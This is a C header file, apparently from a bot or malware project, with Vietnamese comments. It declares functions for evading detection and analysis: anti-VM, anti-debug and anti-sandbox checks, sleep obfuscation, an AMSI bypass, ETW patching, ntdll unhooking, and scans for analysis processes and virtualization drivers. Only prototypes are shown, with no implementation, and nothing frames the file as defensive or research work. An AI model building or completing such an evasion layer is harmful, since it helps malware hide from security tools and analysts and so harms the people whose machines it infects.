/**
 * bot_evasion.h
 * Khai bao prototype cho cac ham chong phat hien va phan tich
 */

#ifndef BOT_EVASION_H
#define BOT_EVASION_H

/**
 * Kiem tra moi truong ao (VMware, VirtualBox, Sandbox)
 * Tra ve: 1 neu phat hien VM, 0 neu may that
 */
int anti_vm(void);

/**
 * Kiem tra debugger dang duoc gan
 * Tra ve: 1 neu phat hien debugger, 0 neu khong
 */
int anti_debug(void);

/**
 * Kiem tra moi truong sandbox
 * Tra ve: 1 neu nghi ngo la sandbox, 0 neu may that
 */
int anti_sandbox(void);

/**
 * Ngu phan tan de tranh phat hien
 * Dau vao: tong_thoi_gian_ms - tong thoi gian ngu (ms)
 */
void sleep_obfuscation(int tong_thoi_gian_ms);

/**
 * Bypass AMSI (Windows only)
 */
void amsi_bypass(void);

/**
 * Vo hieu hoa ETW (Event Tracing for Windows)
 */
void etw_patch(void);

/**
 * Nap lai ban sao sach cua ntdll.dll de tranh hooking
 */
void unhook_ntdll(void);

/**
 * Kiem tra cac process phan tich dang chay
 * Tra ve: 1 neu co process phan tich, 0 neu khong
 */
int kiem_tra_tien_trinh_phan_tich(void);

/**
 * Kiem tra cac driver ao hoa
 * Tra ve: 1 neu phat hien driver ao hoa, 0 neu khong
 */
int kiem_tra_driver_ao_hoa(void);

#endif /* BOT_EVASION_H */